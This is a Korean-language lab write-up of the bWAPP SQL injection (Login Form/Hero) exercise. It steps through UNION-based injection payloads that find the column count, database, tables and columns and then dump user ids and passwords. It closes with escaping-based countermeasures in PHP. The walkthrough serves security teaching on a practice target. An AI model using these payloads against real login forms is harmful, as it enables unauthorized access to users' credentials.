---
x`title: "[bWAPP] 1. Injection - SQL Injection - (Login Form/Hero)"

---

<br>

## Injection

공격자가 신뢰할 수 없는 입력을 프로그램에 주입하도록 하는 공격.

<br>

<br>

## SQL Injection

응용 프로그램 보안 상의 허점을 의도적으로 이용해, 

임의의 SQL문을 주입하여 악의적인 SQL문을 실행하게 함으로써

DB를 비정상적으로 조작하는 코드 인젝션의 대표적인 공격.

이로인해 공격자가 DB에 저장되어 있는 다른 사용자의 개인 정보 등 허가되지 않은 정보에 접근하여,

데이터 변조 및 조작 가능.

<br>

<br>

## Object

개인정보를 탈취해보자

![image-20220316195556024](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316195556024.png)

![image-20220316195630270](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316195630270.png)

- 항상 참인 조건으로 삽입 공격
- `"select column from table where id=' " &id " ' " and  "password=' " &password " ' "` 으로 유추가능

<br>

### 컬럼 갯수

![image-20220316195916126](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316195916126.png)

- ' union select all 1 # ~ 'union select all 1,2,3,4 # 까지 해본 결과
- 컬럼 갯수는 4개
- 그 중 쓰이는 컬럼은 2번과 4번

<br>

### DB

![image-20220316200102096](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316200102096.png)

`' union select all 1,database(),3,4 #`

- DB는 BWAPP

<br>

### 테이블 조회

![image-20220316200400317](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316200400317.png)

`' union select all 1,table_name,3,4 from information_schema.tables where table_schema='bWAPP' limit 3,1#`

- limit 활용해서 0번부터 쭉 조회 3번이 users 테이블

<br>

### 컬럼 조회

![image-20220316200507757](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316200507757.png)

`' union select all 1,column_name,3,4 from information_schema.columns where table_name='users'#`

- 이 또한 limit활용해서 컬럼들 조회

<br>

### 컬럼 속성

![image-20220316200629848](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220316200629848.png)

`' union select all 1,id,3,password from users#`

- 성공적으로 개인취약점 정보 확인 가능

<br>

<br>

## 대응방안

### Linux

![image-20220318002544545](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220318002544545.png)

![image-20220318002653266](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220318002653266.png)

- vi 편집기로 sqli_3.php 소스코드를 열어준다.
- level 1 : sqli_check_1 함수 사용
- level 2 : sqli_check_2 함수 사용

<br>

### functions_external.php

![image-20220317235926576](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317235926576.png)

- addslashes : 특수 문자(',",/) 앞에 역슬래시를 삽입하여 특수문자 기능을 문자로 이스케이프하는 함수
  - 인코딩된 태그나 스크립트가 들어오면 바로 디코딩되기 때문에 보안 허점 발생
- mysql_real_escape_string : PHP에서 SQL Injection 공격 등을 방어하기 위하여 특수 문자열을 이스케이프 하기 위한 함수
  - `\x00, \n, \r, \, ', ", \x1a`와 같은 문자 앞에 `\`(역슬레시)를 붙여서 해당 문자가 실제 작동하지 않도록 이스케이프 해준다.
  - addslashes 보다 처리할 수 있는 문자들이 더 많음
